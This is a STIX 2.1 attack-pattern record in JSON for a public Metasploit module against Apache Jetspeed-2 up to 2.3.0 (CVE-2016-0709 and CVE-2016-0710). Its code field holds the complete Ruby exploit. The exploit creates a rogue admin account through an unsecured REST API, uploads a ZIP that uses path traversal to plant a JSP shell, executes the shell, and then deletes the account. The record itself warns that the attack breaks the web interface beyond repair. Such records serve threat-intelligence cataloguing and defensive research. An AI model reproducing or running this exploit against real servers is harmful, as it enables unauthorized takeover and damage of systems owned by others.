{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--72a57142-cee2-49c4-8456-600dfb79f417",
    "created": "2024-08-14T17:10:37.727562Z",
    "modified": "2024-08-14T17:10:37.727566Z",
    "name": "Apache Jetspeed Arbitrary File Upload",
    "description": " This module exploits the unsecured User Manager REST API and a ZIP file path traversal in Apache Jetspeed-2, version 2.3.0 and unknown earlier versions, to upload and execute a shell.  Note: this exploit will create, use, and then delete a new admin user.  Warning: in testing, exploiting the file upload clobbered the web interface beyond repair. No workaround has been found yet. Use this module at your own risk. No check will be implemented. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/apache_jetspeed_file_upload.rb",
            "external_id": "apache_jetspeed_file_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-0710"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-0709"
        },
        {
            "source_name": "reference",
            "url": "http://haxx.ml/post/140552592371/remote-code-execution-in-apache-jetspeed-230-and"
        },
        {
            "source_name": "reference",
            "url": "https://portals.apache.org/jetspeed-2/security-reports.html#CVE-2016-0709"
        },
        {
            "source_name": "reference",
            "url": "https://portals.apache.org/jetspeed-2/security-reports.html#CVE-2016-0710"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apache Jetspeed Arbitrary File Upload',\n      'Description'    => %q{\n        This module exploits the unsecured User Manager REST API and a ZIP file\n        path traversal in Apache Jetspeed-2, version 2.3.0 and unknown earlier\n        versions, to upload and execute a shell.\n\n        Note: this exploit will create, use, and then delete a new admin user.\n\n        Warning: in testing, exploiting the file upload clobbered the web\n        interface beyond repair. No workaround has been found yet. Use this\n        module at your own risk. No check will be implemented.\n      },\n      'Author'         => [\n        'Andreas Lindh', # Vulnerability discovery\n        'wvu'            # Metasploit module\n      ],\n      'References'     => [\n        ['CVE', '2016-0710'],\n        ['CVE', '2016-0709'],\n        ['URL', 'http://haxx.ml/post/140552592371/remote-code-execution-in-apache-jetspeed-230-and'],\n        ['URL', 'https://portals.apache.org/jetspeed-2/security-reports.html#CVE-2016-0709'],\n        ['URL', 'https://portals.apache.org/jetspeed-2/security-reports.html#CVE-2016-0710']\n      ],\n      'DisclosureDate' => '2016-03-06',\n      'License'        => MSF_LICENSE,\n      'Platform'       => ['linux', 'win'],\n      'Arch'           => ARCH_JAVA,\n      'Privileged'     => false,\n      'Targets'        => [\n        ['Apache Jetspeed <= 2.3.0 (Linux)',   'Platform' => 'linux'],\n        ['Apache Jetspeed <= 2.3.0 (Windows)', 'Platform' => 'win']\n      ],\n      'DefaultTarget'  => 0\n    ))\n\n    register_options([\n      Opt::RPORT(8080)\n    ])\n  end\n\n  def print_status(msg='')\n    super(\"#{peer} - #{msg}\")\n  end\n\n  def print_warning(msg='')\n    super(\"#{peer} - #{msg}\")\n  end\n\n  def exploit\n    print_status(\"Creating admin user: #{username}:#{password}\")\n    create_admin_user\n    print_status('Logging in as newly created admin')\n    jetspeed_login\n    print_status(\"Uploading payload ZIP: #{zip_filename}\")\n    upload_payload_zip\n    print_status(\"Executing JSP shell: /jetspeed/#{jsp_filename}\")\n    exec_jsp_shell\n  end\n\n  def cleanup\n    print_status(\"Deleting user: #{username}\")\n    delete_user\n    super\n  end\n\n  #\n  # Exploit methods\n  #\n\n  def create_admin_user\n    send_request_cgi(\n      'method'    => 'POST',\n      'uri'       => '/jetspeed/services/usermanager/users',\n      'vars_post' => {\n        'name'             => username,\n        'password'         => password,\n        'password_confirm' => password\n      }\n    )\n    send_request_cgi(\n      'method'    => 'POST',\n      'uri'       => \"/jetspeed/services/usermanager/users/#{username}\",\n      'vars_post' => {\n        'user_enabled' => 'true',\n        'roles'        => 'admin'\n      }\n    )\n  end\n\n  def jetspeed_login\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri'    => '/jetspeed/login/redirector'\n    )\n\n    res = send_request_cgi!(\n      'method'    => 'POST',\n      'uri'       => '/jetspeed/login/j_security_check',\n      'cookie'    => res.get_cookies,\n      'vars_post' => {\n        'j_username' => username,\n        'j_password' => password\n      }\n    )\n\n    @cookie = res.get_cookies\n  end\n\n  # Let's pretend we're mechanize\n  def import_file\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri'    => '/jetspeed/portal/Administrative/site.psml',\n      'cookie' => @cookie\n    )\n\n    html = res.get_html_document\n    import_export = html.at('//a[*//text() = \"Import/Export\"]/@href')\n\n    res = send_request_cgi!(\n      'method' => 'POST',\n      'uri'    => import_export,\n      'cookie' => @cookie\n    )\n\n    html = res.get_html_document\n    html.at('//form[*//text() = \"Import File\"]/@action')\n  end\n\n  def upload_payload_zip\n    zip = Rex::Zip::Archive.new\n    zip.add_file(\"../../webapps/jetspeed/#{jsp_filename}\", payload.encoded)\n\n    mime = Rex::MIME::Message.new\n    mime.add_part(zip.pack, 'application/zip', 'binary',\n                  %Q{form-data; name=\"fileInput\"; filename=\"#{zip_filename}\"})\n    mime.add_part('on', nil, nil, 'form-data; name=\"copyIdsOnImport\"')\n    mime.add_part('Import', nil, nil, 'form-data; name=\"uploadFile\"')\n\n    case target['Platform']\n    when 'linux'\n      register_file_for_cleanup(\"../webapps/jetspeed/#{jsp_filename}\")\n      register_dir_for_cleanup(\"../temp/#{username}\")\n    when 'win'\n      register_file_for_cleanup(\"..\\\\webapps\\\\jetspeed\\\\#{jsp_filename}\")\n      register_dir_for_cleanup(\"..\\\\temp\\\\#{username}\")\n    end\n\n    send_request_cgi(\n      'method' => 'POST',\n      'uri'    => import_file,\n      'ctype'  => \"multipart/form-data; boundary=#{mime.bound}\",\n      'cookie' => @cookie,\n      'data'   => mime.to_s\n    )\n  end\n\n  def exec_jsp_shell\n    send_request_cgi(\n      'method' => 'GET',\n      'uri'    => \"/jetspeed/#{jsp_filename}\",\n      'cookie' => @cookie\n    )\n  end\n\n  #\n  # Cleanup methods\n  #\n\n  def delete_user\n    send_request_cgi(\n      'method' => 'DELETE',\n      'uri'    => \"/jetspeed/services/usermanager/users/#{username}\"\n    )\n  end\n\n  #\n  # Utility methods\n  #\n\n  def username\n    @username ||= Rex::Text.rand_text_alpha_lower(8)\n  end\n\n  def password\n    @password ||= Rex::Text.rand_text_alphanumeric(8)\n  end\n\n  def jsp_filename\n    @jsp_filename ||= Rex::Text.rand_text_alpha(8) + '.jsp'\n  end\n\n  def zip_filename\n    @zip_filename ||= Rex::Text.rand_text_alpha(8) + '.zip'\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-03-06",
    "x_mitre_platforms": [
        "['linux', 'win']"
    ]
}